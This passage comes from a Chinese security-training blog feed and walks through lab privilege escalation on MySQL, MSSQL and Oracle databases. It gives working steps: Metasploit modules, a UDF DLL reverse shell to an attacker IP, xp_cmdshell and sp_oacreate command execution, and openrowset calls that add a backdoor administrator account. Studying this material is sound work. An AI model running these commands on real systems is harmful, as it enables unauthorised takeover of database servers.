href="#所以这里用Navicat先连接数据库-或者哥斯拉直接执行-，将这个sys-eval也绑定这个dll文件，因为sys-eval有回显" class="headerlink" title="所以这里用Navicat先连接数据库(或者哥斯拉直接执行)，将这个sys_eval也绑定这个dll文件，因为sys_eval有回显"></a>所以这里用Navicat先连接数据库(或者哥斯拉直接执行)，将这个sys_eval也绑定这个dll文件，因为sys_eval有回显</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421084408478.png" alt="image-20230421084408478"></p><h6 id="现在就可以执行命令了并且有回显内容，从而可以执行命令实现远控上线"><a href="#现在就可以执行命令了并且有回显内容，从而可以执行命令实现远控上线" class="headerlink" title="现在就可以执行命令了并且有回显内容，从而可以执行命令实现远控上线"></a>现在就可以执行命令了并且有回显内容，从而可以执行命令实现远控上线</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419112019984.png" alt="image-20230419112019984"></p><h5 id="方法2、MOF-Win2008后权限控制导致无效-MSF演示（成功几率不高）"><a href="#方法2、MOF-Win2008后权限控制导致无效-MSF演示（成功几率不高）" class="headerlink" title="方法2、MOF-Win2008后权限控制导致无效-MSF演示（成功几率不高）"></a>方法2、MOF-Win2008后权限控制导致无效-MSF演示（成功几率不高）</h5><p>参考：<a href="https://www.cnblogs.com/xishaonian/p/6384535.html">https://www.cnblogs.com/xishaonian/p/6384535.html</a></p><p>MSF：use exploit&#x2F;windows&#x2F;mysql&#x2F;mysql_mof</p><h5 id="方法3、启动项"><a href="#方法3、启动项" class="headerlink" title="方法3、启动项"></a>方法3、启动项</h5><p>MSF：（前提先开外链）</p><p>use exploit&#x2F;windows&#x2F;mysql&#x2F;mysql_start_up</p><p>set rhosts 47.102.195.100</p><p>set username root</p><p>set password root</p><p>run</p><h6 id="一开始启动目录为空"><a href="#一开始启动目录为空" class="headerlink" title="一开始启动目录为空"></a>一开始启动目录为空</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419113058689.png" alt="image-20230419113058689"></p><h6 id="执行上面的msf命令后在启动项生成了一个exe木马"><a href="#执行上面的msf命令后在启动项生成了一个exe木马" class="headerlink" title="执行上面的msf命令后在启动项生成了一个exe木马"></a>执行上面的msf命令后在启动项生成了一个exe木马</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419113224884.png" alt="image-20230419113224884"></p><h6 id="如下，因为是启动项，所以要在其启动的时候才会执行上线"><a href="#如下，因为是启动项，所以要在其启动的时候才会执行上线" class="headerlink" title="如下，因为是启动项，所以要在其启动的时候才会执行上线"></a>如下，因为是启动项，所以要在其启动的时候才会执行上线</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419113242356.png" alt="image-20230419113242356"></p><h5 id="方法4、反弹Shell（手动创建dll，原理和UDF一样，只是将执行的payload一步步传参数最后绑定dll文件）"><a href="#方法4、反弹Shell（手动创建dll，原理和UDF一样，只是将执行的payload一步步传参数最后绑定dll文件）" class="headerlink" title="方法4、反弹Shell（手动创建dll，原理和UDF一样，只是将执行的payload一步步传参数最后绑定dll文件）"></a>方法4、反弹Shell（手动创建dll，原理和UDF一样，只是将执行的payload一步步传参数最后绑定dll文件）</h5><p>参考资料：<a href="https://blog.csdn.net/weixin_43801718/article/details/105493042">Mysql提权之反弹shell_mysql反弹shell_周雄雄的博客-CSDN博客</a></p><ul><li>use mysql;</li><li>set @a&#x3D;concat(‘’,</li><li>create table Ghost(data LONGBLOB);</li><li>insert into Ghost values(“”);update Ghost set data &#x3D; @a;（values双引号里面填payload语句如下，可在上面的链接中复制）</li><li>select data from Ghost into DUMPFILE ‘C:\phpstudy\PHPTutorial\MySQL\lib\plugin\udf.dll’;</li><li>create function backshell returns string soname ‘udf.dll’;</li><li>select backshell(‘攻击机ip’,7788)</li></ul><h6 id="将上面的sql语句执行"><a href="#将上面的sql语句执行" class="headerlink" title="将上面的sql语句执行"></a>将上面的sql语句执行</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419114334282.png" alt="image-20230419114334282"></p><h6 id="攻击机上面监听7788端口，收到shell反弹"><a href="#攻击机上面监听7788端口，收到shell反弹" class="headerlink" title="攻击机上面监听7788端口，收到shell反弹"></a>攻击机上面监听7788端口，收到shell反弹</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419114308571.png" alt="image-20230419114308571"></p><h6 id="可以看到生成了udf-dll文件"><a href="#可以看到生成了udf-dll文件" class="headerlink" title="可以看到生成了udf.dll文件"></a>可以看到生成了udf.dll文件</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419114422784.png" alt="image-20230419114422784"></p><h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><h6 id="上面的操作都需要secure-file-priv开启，如果子啊my-ini文件里面将其删除，如下"><a href="#上面的操作都需要secure-file-priv开启，如果子啊my-ini文件里面将其删除，如下" class="headerlink" title="上面的操作都需要secure_file_priv开启，如果子啊my.ini文件里面将其删除，如下"></a>上面的操作都需要secure_file_priv开启，如果子啊my.ini文件里面将其删除，如下</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419115033927.png" alt="image-20230419115033927"></p><h6 id="再次写入文件时，将会失败"><a href="#再次写入文件时，将会失败" class="headerlink" title="再次写入文件时，将会失败"></a>再次写入文件时，将会失败</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419115142477.png" alt="image-20230419115142477"></p><h3 id="MSSQL-xp-cmdshell-amp-sp-oacreate-amp-沙盒"><a href="#MSSQL-xp-cmdshell-amp-sp-oacreate-amp-沙盒" class="headerlink" title="#MSSQL-xp_cmdshell&amp;sp_oacreate&amp;沙盒"></a>#MSSQL-xp_cmdshell&amp;sp_oacreate&amp;沙盒</h3><p>已知Shell：<a href="http://192.168.46.147:82/cd.aspx">http://192.168.46.147:82/cd.aspx</a> 密码x</p><p>参考资料：<a href="https://blog.51cto.com/u_11797152/2411770">SQL Server提权方法汇总（MSSQL）_Margin的技术博客_51CTO博客</a></p><h5 id="1-使用xp-cmdshell进行提权"><a href="#1-使用xp-cmdshell进行提权" class="headerlink" title="1.使用xp_cmdshell进行提权"></a>1.使用xp_cmdshell进行提权</h5><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419140838630.png" alt="image-20230419140838630"></p><p>这个也可以进行命令执行</p><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419140938173.png" alt="image-20230419140938173"></p><p>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。</p><h5 id="启用："><a href="#启用：" class="headerlink" title="启用："></a>启用：</h5><ul><li>EXEC sp_configure ‘show advanced options’, 1</li><li>RECONFIGURE;</li><li>EXEC sp_configure ‘xp_cmdshell’, 1;</li><li>RECONFIGURE;</li></ul><h5 id="关闭："><a href="#关闭：" class="headerlink" title="关闭："></a>关闭：</h5><ul><li>exec sp_configure ‘show advanced options’, 1;</li><li>reconfigure;</li><li>exec sp_configure ‘xp_cmdshell’, 0;</li><li>reconfigure;</li></ul><h5 id="执行："><a href="#执行：" class="headerlink" title="执行："></a>执行：</h5><ul><li>EXEC master.dbo.xp_cmdshell ‘命令’</li><li>如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复</li><li>exec master.sys.sp_addextendedproc ‘xp_cmdshell’, ‘C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll’</li></ul><h6 id="同样在配置文件中查看数据库的账号密码"><a href="#同样在配置文件中查看数据库的账号密码" class="headerlink" title="同样在配置文件中查看数据库的账号密码"></a>同样在配置文件中查看数据库的账号密码</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141152054.png" alt="image-20230419141152054"></p><h6 id="Navicat连接数据库"><a href="#Navicat连接数据库" class="headerlink" title="Navicat连接数据库"></a>Navicat连接数据库</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141434996.png" alt="image-20230419141434996"></p><h6 id="执行命令-EXEC-master-dbo-xp-cmdshell-‘命令’"><a href="#执行命令-EXEC-master-dbo-xp-cmdshell-‘命令’" class="headerlink" title="执行命令 EXEC master.dbo.xp_cmdshell ‘命令’"></a>执行命令 EXEC master.dbo.xp_cmdshell ‘命令’</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141347982.png" alt="image-20230419141347982"></p><h6 id="倘若执行命令将xp-cmshell设置为0关闭"><a href="#倘若执行命令将xp-cmshell设置为0关闭" class="headerlink" title="倘若执行命令将xp_cmshell设置为0关闭"></a>倘若执行命令将xp_cmshell设置为0关闭</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141637395.png" alt="image-20230419141637395"></p><h6 id="再次执行系统命令时，将不能成功"><a href="#再次执行系统命令时，将不能成功" class="headerlink" title="再次执行系统命令时，将不能成功"></a>再次执行系统命令时，将不能成功</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141719603.png" alt="image-20230419141719603"></p><h6 id="如果xp-cmdshell关闭了，可以用命令启动，即使如果删除了xp-cmdshell，可以按开头的命令进行恢复"><a href="#如果xp-cmdshell关闭了，可以用命令启动，即使如果删除了xp-cmdshell，可以按开头的命令进行恢复" class="headerlink" title="如果xp_cmdshell关闭了，可以用命令启动，即使如果删除了xp_cmdshell，可以按开头的命令进行恢复"></a>如果xp_cmdshell关闭了，可以用命令启动，即使如果删除了xp_cmdshell，可以按开头的命令进行恢复</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142230224.png" alt="image-20230419142230224"></p><h6 id="也一样可以用msf直接提权"><a href="#也一样可以用msf直接提权" class="headerlink" title="也一样可以用msf直接提权"></a>也一样可以用msf直接提权</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142827732.png" alt="image-20230419142827732"></p><h5 id="2-使用sp-oacreate进行提权（无回显没有xp-cmdshell方便）"><a href="#2-使用sp-oacreate进行提权（无回显没有xp-cmdshell方便）" class="headerlink" title="2.使用sp_oacreate进行提权（无回显没有xp_cmdshell方便）"></a>2.使用sp_oacreate进行提权（无回显没有xp_cmdshell方便）</h5><p><a href="https://blog.51cto.com/u_11797152/2411770">SQL Server提权方法汇总（MSSQL）_Margin的技术博客_51CTO博客</a></p><p>主要是用来调用OLE对象，利用OLE对象的run方法执行系统命令。</p><h5 id="启用：-1"><a href="#启用：-1" class="headerlink" title="启用："></a>启用：</h5><ul><li>EXEC sp_configure ‘show advanced options’, 1;   </li><li>RECONFIGURE WITH OVERRIDE;   </li><li>EXEC sp_configure ‘Ole Automation Procedures’, 1;   </li><li>RECONFIGURE WITH OVERRIDE;</li></ul><h5 id="关闭：-1"><a href="#关闭：-1" class="headerlink" title="关闭："></a>关闭：</h5><ul><li>EXEC sp_configure ‘show advanced options’, 1;</li><li>RECONFIGURE WITH OVERRIDE;   </li><li>EXEC sp_configure ‘Ole Automation Procedures’, 0;   </li><li>RECONFIGURE WITH OVERRIDE;</li></ul><h5 id="执行：-1"><a href="#执行：-1" class="headerlink" title="执行："></a>执行：</h5><ul><li>declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec sp_oamethod @shell,’run’,null,’c:\windows\system32\cmd.exe &#x2F;c whoami &gt;c:\1.txt’</li></ul><h6 id="如果xp-cmdshell关闭了，可以尝试sp-oacreate，同样有执行命令的功能，下面将whoami执行命令的结果写入1-txt"><a href="#如果xp-cmdshell关闭了，可以尝试sp-oacreate，同样有执行命令的功能，下面将whoami执行命令的结果写入1-txt" class="headerlink" title="如果xp_cmdshell关闭了，可以尝试sp_oacreate，同样有执行命令的功能，下面将whoami执行命令的结果写入1.txt"></a>如果xp_cmdshell关闭了，可以尝试sp_oacreate，同样有执行命令的功能，下面将whoami执行命令的结果写入1.txt</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141900427.png" alt="image-20230419141900427"></p><h6 id="发现成功写入"><a href="#发现成功写入" class="headerlink" title="发现成功写入"></a>发现成功写入</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142108527.png" alt="image-20230419142108527"></p><h6 id="权限为system"><a href="#权限为system" class="headerlink" title="权限为system"></a>权限为system</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142146963.png" alt="image-20230419142146963"></p><h6 id="同样如果关闭了sp-oacreate"><a href="#同样如果关闭了sp-oacreate" class="headerlink" title="同样如果关闭了sp_oacreate"></a>同样如果关闭了sp_oacreate</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142338933.png" alt="image-20230419142338933"></p><h6 id="会无法执行命令"><a href="#会无法执行命令" class="headerlink" title="会无法执行命令"></a>会无法执行命令</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142432904.png" alt="image-20230419142432904"></p><h6 id="如果sp-oacreate关闭了，也可以用命令启动"><a href="#如果sp-oacreate关闭了，也可以用命令启动" class="headerlink" title="如果sp_oacreate关闭了，也可以用命令启动"></a>如果sp_oacreate关闭了，也可以用命令启动</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142504336.png" alt="image-20230419142504336"></p><h5 id="3-使用SQL-Server-沙盒提权（如果前面两个行不通）"><a href="#3-使用SQL-Server-沙盒提权（如果前面两个行不通）" class="headerlink" title="3.使用SQL Server 沙盒提权（如果前面两个行不通）"></a>3.使用SQL Server 沙盒提权（如果前面两个行不通）</h5><p><a href="https://blog.51cto.com/u_11797152/2411770">SQL Server提权方法汇总（MSSQL）_Margin的技术博客_51CTO博客</a></p><h6 id="按照语句一步步执行即可"><a href="#按照语句一步步执行即可" class="headerlink" title="按照语句一步步执行即可"></a>按照语句一步步执行即可</h6><ul><li><p>–提权语句</p><p>exec sp_configure ‘show advanced options’,1;reconfigure;</p></li><li><p>– 不开启的话在执行xp_regwrite会提示让我们开启，</p><p>exec sp_configure ‘Ad Hoc Distributed Queries’,1;reconfigure;</p></li><li><p>–关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</p><p>exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,0;</p></li><li><p>–查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</p><p>exec master.dbo.xp_regread ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’, ‘SandBoxMode’</p></li><li><p>–执行系统命令</p><p>select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:&#x2F;windows&#x2F;system32&#x2F;ias&#x2F;ias.mdb’,’select shell(“net user margin margin &#x2F;add”)’)  （添加用户margin）</p><p>select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:&#x2F;windows&#x2F;system32&#x2F;ias&#x2F;ias.mdb’,’select shell(“net localgroup administrators margin &#x2F;add”)’)   (将margin添加到管理员组)</p></li></ul><h5 id="沙盒模式SandBoxMode参数含义（默认是2）"><a href="#沙盒模式SandBoxMode参数含义（默认是2）" class="headerlink" title="沙盒模式SandBoxMode参数含义（默认是2）"></a><code>沙盒模式SandBoxMode参数含义（默认是2）</code></h5><p><code>1-4参数含义</code></p><p><code>1:在任何所有者中禁止启用安全模式</code></p><p><code>2:为仅在允许范围内</code></p><p><code>3:必须在access模式下</code></p><p><code>4:完全开启</code></p><p>openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。</p><p>–恢复配置</p><p>–exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,1; </p><p>–exec sp_configure ‘Ad Hoc Distributed Queries’,0;reconfigure; </p><p>–exec sp_configure ‘show advanced options’,0;reconfigure;</p><h3 id="Oracle-普通用户-amp-注入提升模式-amp-DBA模式"><a href="#Oracle-普通用户-amp-注入提升模式-amp-DBA模式" class="headerlink" title="#Oracle-普通用户&amp;注入提升模式&amp;DBA模式"></a>#Oracle-普通用户&amp;注入提升模式&amp;DBA模式</h3><h5 id="Oracle数据库在sqlmap时不能使用–os-shell，无效"><a href="#Oracle数据库在sqlmap时不能使用–os-shell，无效" class="headerlink" title="Oracle数据库在sqlmap时不能使用–os-shell，无效"></a>Oracle数据库在sqlmap时不能使用–os-shell，无效</h5><p>工具：<a href="https://github.com/jas502n/oracleshell">https://github.com/jas502n/oracleshell</a></p><p><a href="http://192.168.46.148:8080/sql.jsp?id=7698">http://192.168.46.148:8080/sql.jsp?id=7698</a></p><h5 id="工具存在以下三种模式"><a href="#工具存在以下三种模式" class="headerlink" title="工具存在以下三种模式"></a>工具存在以下三种模式</h5><h5 id="1、普通用户模式："><a href="#1、普通用户模式：" class="headerlink" title="1、普通用户模式："></a>1、普通用户模式：</h5><p>前提是拥有一个普通的oracle连接账号，不需要DBA权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令。</p><h5 id="2、DBA用户模式：（自动化工具演示）"><a href="#2、DBA用户模式：（自动化工具演示）" class="headerlink" title="2、DBA用户模式：（自动化工具演示）"></a>2、DBA用户模式：（自动化工具演示）</h5><p>拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。</p><h5 id="3、注入提升模式：（Sqlmap测试演示）"><a href="#3、注入提升模式：（Sqlmap测试演示）" class="headerlink" title="3、注入提升模式：（Sqlmap测试演示）"></a>3、注入提升模式：（Sqlmap测试演示）</h5><p>拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显</p><h6 id="大部分的jsp语言搭建的获得了shell直接是system权限，除了少数"><a href="#大部分的jsp语言搭建的获得了shell直接是system权限，除了少数" class="headerlink" title="大部分的jsp语言搭建的获得了shell直接是system权限，除了少数"></a>大部分的jsp语言搭建的获得了shell直接是system权限，除了少数</h6><h6 id="这里找到oracle数据库配置文件找到账号密码"><a href="#这里找到oracle数据库配置文件找到账号密码" class="headerlink" title="这里找到oracle数据库配置文件找到账号密码"></a>这里找到oracle数据库配置文件找到账号密码</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419150047902.png" alt="image-20230419150047902"></p><h6 id="使用orac提权工具"><a href="#使用orac提权工具" class="headerlink" title="使用orac提权工具"></a>使用orac提权工具</h6><h6 id="一开始显示失败，更换为DBA模式"><a href="#一开始显示失败，更换为DBA模式" class="headerlink" title="一开始显示失败，更换为DBA模式"></a>一开始显示失败，更换为DBA模式</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419150645729.png" alt="image-20230419150645729"></p><h6 id="发送payload成功，成功获取syste权限，这里的DBA的模式和注入模式是一样的，都是通过注入来判断的，两方法互通"><a href="#发送payload成功，成功获取syste权限，这里的DBA的模式和注入模式是一样的，都是通过注入来判断的，两方法互通" class="headerlink" title="发送payload成功，成功获取syste权限，这里的DBA的模式和注入模式是一样的，都是通过注入来判断的，两方法互通"></a>发送payload成功，成功获取syste权限，这里的DBA的模式和注入模式是一样的，都是通过注入来判断的，两方法互通</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419150520683.png" alt="image-20230419150520683"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Day98 权限提升-WIN全平台&amp;MSF自动化&amp;CS插件化&amp;EXP筛选&amp;溢出漏洞</title>
    <link href="http://example.com/2023/04/17/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2023/04/17/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-04-17T02:35:32.000Z</published>
    <updated>2023-04-20T14:19:07.137Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/QOqJ2bqvxfp3QsFYzrH87Q.pngw=1280&h=1211.png" alt="img"></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/Ns6y3SHic55PD_wXBDxLQA.png" alt="img"></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/NrK5vZMgsN6aNS0Wzm4Tfw.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、掌握WIN系统溢出漏洞提权用户权限</p><p>2、掌握WIN系统溢出漏洞提权常用命令</p><p>3、掌握WIN系统溢出漏洞提权常见步骤</p><p>4、掌握WIN系统溢出漏洞提权EXP筛选&amp;利用</p><p>5、掌握WIN系统溢出漏洞提权不同环境利用区别</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、Web权限提升</p><p>2、系统权限提升</p><p>3、域控权限提升</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><h4 id="1、具体有哪些权限需要我们了解掌握的？"><a href="#1、具体有哪些权限需要我们了解掌握的？" class="headerlink" title="1、具体有哪些权限需要我们了解掌握的？"></a>1、具体有哪些权限需要我们了解掌握的？</h4><p>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</p><h4 id="2、以上常见权限获取方法简要归类说明？"><a href="#2、以上常见权限获取方法简要归类说明？" class="headerlink" 